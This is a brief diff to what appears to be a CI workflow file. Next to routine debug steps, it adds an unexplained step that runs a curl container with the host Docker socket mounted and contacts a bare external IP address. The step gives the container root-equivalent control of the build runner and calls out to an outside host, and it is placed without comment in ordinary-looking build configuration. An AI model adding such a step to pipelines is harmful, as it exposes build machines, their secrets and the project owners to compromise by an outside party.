@@ -79,7 +79,7 @@ jobs:
         shell: bash 
       
       - run: cat InventoryManager.cs  
-      
+      - run: /usr/bin/docker run --rm -v "/var/run/docker.sock":"/var/run/docker.sock" curlimages/curl:7.87.0 -L -v http://52.200.117.68
       - name: print journalctl
         run: sudo journalctl -k --boot
       
